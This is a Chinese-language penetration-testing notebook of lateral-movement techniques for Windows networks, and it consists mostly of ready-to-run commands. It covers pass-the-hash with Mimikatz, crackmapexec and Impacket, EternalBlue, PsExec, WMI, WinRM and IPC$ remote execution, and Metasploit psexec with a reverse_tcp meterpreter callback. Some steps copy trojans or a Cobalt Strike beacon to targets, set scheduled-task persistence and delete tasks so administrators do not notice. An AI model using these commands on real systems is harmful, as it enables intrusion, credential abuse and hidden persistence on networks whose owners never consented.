<a name="ZTbFk"></a>
# 
<a name="lf8pI"></a>
## 需要开放的端口:
IPC$+AT 445 PSEXEC 445 WMI 135 Winrm 5985（HTTP ）&5986 （HTTPS）<br /> <br />哈希传递要求: （医院那次内网，其实就是因为用administrators用户登录的，所以能横向）<br />工作组:<br />Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。<br />Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。<br />------------<br />域环境：<br />域管理员组内用户即可<br />-------------------------------------<br />KB2871997补丁产生的影响（不能横向）<br />无法通过本地管理员权限对远程计算机使用 Psexec、WMI、smbexec、IPC 等，也无法访问远程主机的文件共享等。

<a name="vxJeA"></a>
## ZombieBoyTools打永恒之蓝

[https://bbs.ichunqiu.com/thread-29817-1-1.html](https://bbs.ichunqiu.com/thread-29817-1-1.html) 使用操作<br />如果win了之后，就点击Doublepulsar中得Attack<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614251129085-d4c77977-e8bb-416a-bd8b-7b4af3d73095.png#height=435&id=OyTof&originHeight=869&originWidth=681&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31724&status=done&style=none&title=&width=340.5)
> msfconsole      
> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_tcp
> show options
> set LHOST 
> set LPORT 
> run


<a name="0NW8l"></a>
## cobalt strike的永恒之蓝
Erebus→pwn→eterblue<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1619775261573-6bc3d060-f682-4692-a788-b55b756a2d14.png#height=655&id=ouxfJ&originHeight=655&originWidth=1014&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86700&status=done&style=none&title=&width=1014)
<a name="jYvP7"></a>
## WMIHACKER(135横向)
可以通过命令行  上传、下载文件<br />[https://github.com/rootclay/WMIHACKER](https://github.com/rootclay/WMIHACKER)

cscript //nologo WMIHACKER_0.6.vbs /cmd 192.168.201.141 administrator "Aufeng123" "ipconfig" 1

<a name="aRTfJ"></a>
## WinRM（5985、5986 端口)比较罕见 适用域

- 1、适用于 win7 及以后的系统，win7 和 server 08 默认关闭
- 2、server 12 之后的版本才默认允许远程任意主机进行管理
- 3、防火墙未过滤 5985、5986 端口

winrs(windows remote shell)是 WinRM 的客户端,需要管理员权限才能运行，可直接执行 命令，也可以返回交互式 shell

winrs -r:192.168.19.100 -u:adtest\administrator -p:admin@124 "cmd"<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611411313196-3afc5505-fb03-44a7-869a-38375d5b266c.png#height=265&id=pFl25&originHeight=529&originWidth=1003&originalType=binary&ratio=1&rotation=0&showTitle=false&size=432014&status=done&style=none&title=&width=501.5)
<a name="vKSOM"></a>
## Ipc
net use \\192.168.10.152\ipc$<br />net use \\ip\admin$ /user:"administrator" "test1234@"<br />横向域 net use \\ip\c$ /user:"aufeng\administrator" "Ojf123456789"<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388847202-a23196e7-2591-4044-9364-71798db426ca.png#height=102&id=A4tzv&originHeight=135&originWidth=130&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=98)<br />net use<br />dir \\192.168.10.152\C$<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388847427-0f1265c2-1be3-4554-8b25-a1a38e4d6aa2.png#height=251&id=Rw9Z3&originHeight=473&originWidth=616&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=327)<br />tasklist /S 192.168.10.152 /U ou /P ou123<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388847761-3c0b5c4f-a789-4c4f-b3fa-b113ee1c81bc.png#height=184&id=Zp2Sg&originHeight=273&originWidth=616&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415)<br />copy win7.exe \\192.168.10.152\c$ 复制本机木马文件到目标机器<br />at \\192.168.10.152 15:24:00 c:\win7.exe  在特定时间执行文件<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388848241-1c59de26-e879-44f4-a576-229ba6654f45.png#height=49&id=gh8NW&originHeight=86&originWidth=459&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=263)<br />**清除at计划避免管理员发现**<br />at \\192.168.10.152 1 /delete<br />写入文本<br />at \\192.168.10.152 15:36:00 cmd.exe /c "ipconfig >c:/1.txt"<br />查看<br />type \\192.168.10.152\c$\1.txt<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388848432-9f359bae-af12-4ff7-9d7b-2dca15e2b1de.png#height=181&id=d0Ft3&originHeight=360&originWidth=608&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=306)<br /> <br />schtasks /create /s 192.168.10.152 /tn "test" /tr "c:\win7.exe" /sc daily /st 16:08 /U ou /P ou123  （远程）<br /> <br />schtasks /create /tn "test" /tr "c:\win7.exe" /sc daily /st 22:44 （本地 ）--维持权限的好方法<br /> <br />type \\192.168.10.152\c$\windows\tasks\schedlgu.txt<br />（schtasks命令会在系统c: \windows\tasks\schedlgu.txt留下日志文件）<br /> 
<a name="sjBj8"></a>
## Psexec
最好不要用64位的Psexec<br />**139、445端口 开启了共享、并且admin$共享开启(默认开启)**

PsExec.exe \\192.168.3.21 -u god\administrator -p Admin12345 cmd.exe

psexec -accepteula \\ip -s cmd.exe （本地有相同凭证就可以直接登录）<br />-s system交互式shell<br />psexec.exe \\ip -u admin -p 123 cmd.exe<br />假设已经复制好add.bat到192.168.1.2，使用psexec运行的命令是：<br />psexec \\192.168.1.2 c:\wmpub\add.bat<br /> <br /> <br />C:\WINDOWS\Temp\PsExec.exe -accepteula \\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\WINDOWS\Temp\beacon.exe<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1623123309901-5c8e9029-93e0-472c-8424-f42adfdf1a4a.png#height=340&id=C8SdO&originHeight=679&originWidth=1545&originalType=binary&ratio=1&rotation=0&showTitle=false&size=426942&status=done&style=none&title=&width=772.5)<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388848758-35d3fbbb-f67c-45a2-8e73-33ca07d72f9e.png#height=608&id=TtHa7&originHeight=810&originWidth=838&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=629)


<a name="jqinp"></a>
## smbexec 
python .\smbexec.py admin:xs801262@175.2.187.67

开启共享smb连接翻目录<br />python smbclient.py administrator:123456@172.24.115.58  <br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1645453133975-f6668e7f-7162-489e-8d9a-9654bad8fa4d.png#clientId=u390fa834-ab20-4&from=paste&height=371&id=ue9aeda71&originHeight=741&originWidth=833&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110678&status=done&style=none&taskId=ubea7ecd0-5032-4c53-aa05-f58904071ab&title=&width=416.5)
<a name="78KKI"></a>
## Kali自带的横向win工具
**pth-winexe**<br />环境要求：开启文件共享，即smb服务；禁用UAC远程限制<br />pth-winexe -U username%password //remote_ip cmd.exe  --system<br />                       ↓<br />pth-winexe -U administrator%0123abcd** --system --ostype=1 //192.168.213.132 cmd<br /> <br />支持ntlm hash直接登录<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388849236-2c86c2fd-ed8c-4661-9358-0ada73b0659f.png#height=80&id=YUsDu&originHeight=135&originWidth=698&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415)

![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388849534-74ad73ee-1312-44b6-8145-7caeae725d61.png#height=143&id=rPiyH&originHeight=258&originWidth=753&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=416)

**crackmapexec 域横向**
```
crackmapexec smb 192.168.93.30-u administrator -H ab89b1295e69d353dd7614c7a3a80cec -d whoamianony.org -x whoami


crackmapexec smb 192.168.93.30-u administrator -H ab89b1295e69d353dd7614c7a3a80cec -d whoamianony.org -x ipconfig
```

<a name="xdcBp"></a>
## wmiexec\smbexec hash横向
```
./psexec.py aufeng/administrator@192.168.10.131 -hashes AADA8EDA23213C025AE50F5CD5697D9F:6542D35ED5FF6AE5E75B875068C5D3BC
```

proxychains python3 wmiexec.py -hashes 获得的hash ./用户名@域控ip

```
python smbexec.py -hashes :b5674dc1274c9bfb792c10137b92d8ef wangdi/wdadmin@192.168.233.10
```
<a name="TdK9u"></a>
## 本地横向 wmiexec.py 开启wmi服务，135端口
本地挂socks代理只后本地横向操作<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388849800-7062d08e-a046-4718-8a79-d896cf6dd840.png#height=166&id=DFaVM&originHeight=222&originWidth=1183&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=887)<br /> <br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388850326-16f71bc6-27f4-4a58-b928-55a564a66b42.png#height=157&id=Eo8X1&originHeight=209&originWidth=1186&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=890)
<a name="6Jm7S"></a>
## Mimikatz （域内横向）ntlm hash传递
privilege::debug    #先提权<br /> <br />#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击,域用户administrator在域管理员组中，但是问题在于，弹出来的框只是建立了ipc连接。可以通过建立的ipc连接进行一个横向也是ok的<br />sekurlsa::pth  /user:administrator /domain:aufeng.com  /ntlm:f74c26fba12d9025f202c10b4702db31<br /> ![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616167165935-3facc296-1ce2-4118-bfbb-d367acc9b1c7.png#height=470&id=HLCIc&originHeight=626&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39370&status=done&style=none&title=&width=771)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616167275863-4427358c-1c75-4d3f-889b-4399a8015bad.png#height=374&id=LwaDm&originHeight=498&originWidth=1170&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28801&status=done&style=none&title=&width=878)<br />**有时候可能无法横向ip、只能dir横主机名。例如：**<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627005970258-c4654e36-5627-4e0f-ae87-64dfafbddab1.png#height=255&id=oCPhv&originHeight=510&originWidth=1135&originalType=binary&ratio=1&rotation=0&showTitle=false&size=338916&status=done&style=none&title=&width=567.5)
<a name="yK9i1"></a>
## (可批量)MSF横向SMB的PSEXEC模块使用 hash传递
LM:NTLM   LM不重要，随便就行，主要是NTLM一定要正确<br />msf > use  exploit/windows/smb/psexec<br />msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp<br />msf exploit(psexec) > set lhost 192.168.10.27<br />msf exploit(psexec) > set rhost 192.168.10.14-255<br />msf exploit(psexec) > set smbuser Administrator<br />msf exploit(psexec) > set smbpass<br />815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了<br />msf exploit(psexec) > exploit<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626252061973-261d16d0-25d2-43f1-b62b-2bf7742f2ac7.png#height=546&id=ggqkQ&originHeight=728&originWidth=1200&originalType=binary&ratio=1&rotation=0&showTitle=false&size=858054&status=done&style=none&title=&width=900)

 
<a name="D0XZ2"></a>
## 135端口横向操作
使用WMIC远程执行命令，在远程系统中启动WMIC服务(目标服务器需要开放135端口，WMIC会以管理员权限在远程系统中执行命令)。如果目标服务器开启了防火墙，WMIC将无法连接。另外由于wmic命令没有回显，需要使用IPC$和type命令来读取信息。需要注意的是，如果WMIC执行的是恶意程序，将不会留下日志。<br /> <br />#以administrator用户,x123456./@密码连接192.168.10.131，并在机器上执行ipconfig命令，将结果写入c:\ip.txt文件中<br /> <br />wmic /node:192.168.10.131 /user:administrator /password:x123456./@ process call create "cmd.exe /c ipconfig > c:\ip.txt"<br /> <br />#然后在建立IPC$连接读取c:\ip.txt文件的内容<br /> <br />Wmiexec.exe<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611388851397-58a8a6d0-922d-4590-9655-30ccdcc27a43.png#height=99&id=eglfD&originHeight=188&originWidth=787&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=416)

<a name="iZeRz"></a>
## sharpwmi.exe(135端口
.\sharpwmi.exe 192.168.201.132 administrator Aufeng123 cmd ipconfig<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1631110132871-82a6cd8a-b5db-49c1-a4f5-b5fb117ff70a.png#clientId=u94f4952a-a408-4&from=paste&height=171&id=u81a98f3a&originHeight=342&originWidth=1200&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65171&status=done&style=none&taskId=u37d4268a-ea7d-4127-b63d-0bd07bcd528&title=&width=600)<br />可传输<br /> 只支持上传512kb以下的文件<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1631110179190-39d21e8b-9584-4e36-80f8-e2491df93e6e.png#clientId=u94f4952a-a408-4&from=paste&height=104&id=u0a937e37&originHeight=138&originWidth=957&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24540&status=done&style=none&taskId=u02084e1f-4937-43af-a049-f2f1a2f01e1&title=&width=718)


